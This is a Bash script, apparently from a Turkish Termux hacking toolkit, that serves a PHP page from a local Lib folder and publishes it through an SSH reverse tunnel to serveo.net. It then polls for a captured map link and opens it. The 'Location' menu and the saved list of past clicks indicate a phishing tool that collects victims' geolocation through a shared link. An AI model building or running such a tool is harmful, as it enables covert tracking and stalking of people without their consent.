#!/bin/bash
random="Ahmet"$RANDOM"Keskin"
banner(){
rm -rf Lib/maps.txt && rm -rf Lib/yeni-ip.txt
clear
echo -e "
\e[31m██████████▓ \e[37mMenu 1 /Konum☾✯\e[31m ▓██████████
▓
▓\e[31m[\e[33m1\e[31m]\e[37mBaşlat\e[32m (Start)\e[31m
▓\e[31m[\e[33m2\e[31m]\e[37mÖnceki Tıklamalar\e[32m (Old List)\e[31m
▓	  𝔏𝔬𝔠𝔞𝔱𝔦𝔬𝔫
\e[31m███████████████████████████████████████

\e[37m      ▒░▓▒░▓▒░Ahmet Keskin░▒▓░▒▓░▒

\e[31m[\e[33m99\e[31m]\e[33mMenu

"
read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem

}
don(){

	while true;
	do
		
		if [[ -e "Lib/map.txt" ]]; then
			sleep 5
			cd Lib/ && 
			ok=$(grep -a 'https' map.txt | cut -d " " -f2 | tr -d '\r')
			termux-open-url $ok
			sleep 2
			rm -rf map.txt
			cat old.txt	
		fi

	done	



}



	banner
	if [[ $islem == 01 || $islem == 1 ]]; then
		cd Lib/ &&
		php -S 127.0.0.1:3333 > /dev/null 2>&1 &
		sleep 3 &&
		ssh -R 80:localhost:3333 $random@serveo.net  2>&1 & sleep 5
		don

	elif [[ $islem == 02 || $islem == 2 ]]; then
			cat Lib/old.txt
	elif [[ $islem == 99 ]]; then
			cd .. && bash tst.sh
	else
	clear
	echo -e "\e[31mLütfen işlem numaranızı kontrol ediniz..."				
	sleep 2
	bash tst.sh

	fi

